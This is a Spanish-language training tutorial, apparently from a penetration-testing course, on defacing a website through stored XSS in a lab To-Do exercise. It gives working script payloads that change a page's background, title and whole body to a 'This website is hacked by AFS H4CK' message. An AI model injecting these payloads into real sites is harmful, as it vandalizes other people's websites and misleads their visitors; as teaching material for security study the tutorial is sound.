
# Defacing con XSS

Ahora que comprendemos los diferentes tipos de XSS y los diversos métodos para descubrir vulnerabilidades XSS en páginas web, podemos comenzar a aprender cómo explotar estas vulnerabilidades XSS. Como se mencionó anteriormente, el daño y el alcance de un ataque XSS dependen del tipo de XSS, siendo un `XSS Stored` el más crítico, mientras que un `XSS DOM-Based` lo es menos.

Uno de los ataques más comunes que se suelen utilizar con vulnerabilidades XSS almacenadas son los ataques de desfiguración de sitios web. `Defacing` significa cambiar la apariencia de un sitio web para cualquier persona que lo visite. Es muy común que los grupos de hackers organizados desfiguren un sitio web para afirmar que lo han hackeado con éxito, como cuando los ciberdelincuentes desfiguraron el Servicio Nacional de Salud (NHS) del Reino Unido [en 2018.](https://www.bbc.co.uk/news/technology-43812539) Este tipo de ataques pueden tener un gran eco mediático y pueden afectar significativamente las inversiones y los precios de las acciones de una empresa, especialmente de bancos y empresas de tecnología.

Aunque se pueden utilizar muchas otras vulnerabilidades para lograr lo mismo, las vulnerabilidades XSS almacenadas se encuentran entre las más utilizadas para hacerlo.

***

## <mark style="color:purple;">Elementos de defacing</mark>

Podemos utilizar código JavaScript inyectado (a través de XSS) para que una página web tenga el aspecto que queramos. Sin embargo, la desfiguración de un sitio web suele utilizarse para enviar un mensaje simple (es decir, hemos conseguido hackearlo), por lo que darle a la página web desfigurada un aspecto atractivo no es realmente el objetivo principal.

Generalmente se utilizan tres elementos HTML para cambiar el aspecto principal de una página web:

* Color de fondo: `document.body.style.background`
* Fondo: `document.body.background`
* Título de la página: `document.title`
* Texto de la página: `DOM.innerHTML`

Podemos utilizar dos o tres de estos elementos para escribir un mensaje básico a la página web e incluso eliminar el elemento vulnerable, de forma que sea más difícil resetear rápidamente la página web, como veremos a continuación.

***

### Cambio de fondo

Regresemos a nuestro ejercicio `Stored XSS` y utilicémoslo como base para nuestro ataque.

Para cambiar el fondo de una página web, podemos elegir un color determinado o utilizar una imagen. Utilizaremos un color como fondo, ya que la mayoría de los ataques de defacing utilizan un color oscuro para el fondo. Para ello, podemos utilizar el siguiente payload:

```html
<script>document.body.style.background = "#141d2b"</script>
```

{% hint style="info" %}
**Consejo**: Podemos usar cualquier otro valor hexadecimal o podemos usar un color con nombre como `= "black"`.
{% endhint %}

Una vez que agregamos nuestro payload a la lista `To-Do`, veremos que el color de fondo cambió:

<figure><img src="https://academy.hackthebox.com/storage/modules/103/xss_defacing_background_color.jpg" alt=""><figcaption></figcaption></figure>

Esto persistirá durante las actualizaciones de página y aparecerá para cualquiera que visite la página, ya que estamos utilizando una vulnerabilidad `XSS Stored`.

Otra opción sería establecer una imagen de fondo utilizando el siguiente payload:

```html
<script>document.body.background = "https://cystory-images.s3.amazonaws.com/iStock_000073075477_Medium.jpg"</script>
```

<figure><img src="/files/nEvudrpiEunb8eHl7xOr" alt=""><figcaption></figcaption></figure>

***

### Cambiar el título de la página

Podemos cambiar el título de la página `2Do` por cualquier título que elijamos, usando la función `document.title` de JavaScript:

```html
<script>document.title = 'Hacked by: AFS H4CK'</script>
```

Podemos ver desde la pestaña de la página que nuestro nuevo título ha reemplazado al anterior:

<figure><img src="/files/uWRa0pqUVIxjgCbBbzgf" alt=""><figcaption></figcaption></figure>

***

### Cambiar el texto de la página

Cuando queremos cambiar el texto que se muestra en la página web, podemos utilizar varias funciones de JavaScript para hacerlo. Por ejemplo, podemos cambiar el texto de un elemento HTML/DOM específico utilizando la función `innerHTML`:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

También podemos utilizar funciones jQuery para lograr lo mismo de manera más eficiente o para cambiar el texto de múltiples elementos en una línea (para hacerlo, la biblioteca `jQuery` debe haber sido importada dentro del código fuente de la página):

```javascript
$("#todo").html('New Text');
```

Esto nos da varias opciones para personalizar el texto de la página web y hacer pequeños ajustes para satisfacer nuestras necesidades. Sin embargo, como los grupos de hackers suelen dejar un mensaje simple en la página web y no dejar nada más en ella, cambiaremos todo el código HTML del main `body`, usando `innerHTML`, de la siguiente manera:

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

Como podemos ver, podemos especificar el elemento `body` con `document.getElementsByTagName('body')`, y al especificar `[0]`, estamos seleccionando el primer elemento `body`, que debería cambiar todo el texto de la página web. También podemos usar `jQuery` para lograr lo mismo. Sin embargo, antes de enviar nuestro payload y realizar un cambio permanente, debemos preparar nuestro código HTML por separado y luego usar `innerHTML` para configurar nuestro código HTML en la fuente de la página.

Para nuestro ejercicio, vamos a introducir este código:

```html
<center>
    <h1 style="color: white">This website is hacked</h1>
    <p style="color: white">by AFS H4CK
        <br><br>
        <img src="https://avatars.githubusercontent.com/u/132138425?v=4" height="80px" alt="AFS H4CK">
    </p>
</center>
```

{% hint style="success" %}
**Consejo**: sería prudente intentar ejecutar nuestro código HTML localmente para ver cómo se ve y asegurarnos de que se ejecuta como se espera, antes de comprometernos con él en nuestro payload final.
{% endhint %}

Minimizaremos el código HTML en una sola línea y lo agregaremos a nuestro payload XSS anterior. El payload final debería ser el siguiente:

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">This website is hacked</h1><p style="color: white">by AFS H4CK <br><br> <img src="https://avatars.githubusercontent.com/u/132138425?v=4" height="80px" alt="AFS H4ck"> </p></center>'</script>
```

Una vez que agregamos nuestro payload a la lista `To-Do` vulnerable, veremos que nuestro código HTML ahora es parte permanente del código fuente de la página web y muestra nuestro mensaje para cualquiera que visite la página:

<figure><img src="/files/wy8r9I4OVX4YibV4o5LE" alt=""><figcaption></figcaption></figure>

Al utilizar tres payloads XSS, pudimos desfigurar con éxito nuestra página web de destino. Si observamos el código fuente de la página web, veremos que el código fuente original todavía existe y que nuestros payloads inyectados aparecen al final:

```html
<div></div><ul class="list-unstyled" id="todo"><ul><script>document.title = 'Hacked by: AFS H4CK'</script>
</ul><ul><script>document.body.background = "https://cystory-images.s3.amazonaws.com/iStock_000073075477_Medium.jpg"</script>
</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">This website is hacked</h1><p style="color: white">by AFS H4CK <br><br> <img src="https://avatars.githubusercontent.com/u/132138425?v=4" height="80px" alt="AFS H4ck"> </p></center>'</script>
</ul></ul>
```

Esto se debe a que el código JavaScript que inyectamos cambia el aspecto de la página cuando se ejecuta, que en este caso es al final del código fuente. Si nuestra inyección se realizó en un elemento en el medio del código fuente, es posible que se agreguen otros scripts o elementos después, por lo que tendríamos que tenerlos en cuenta para obtener el aspecto final que necesitamos.

Sin embargo, para los usuarios normales, la página parece desfigurada y muestra nuestra nueva apariencia.
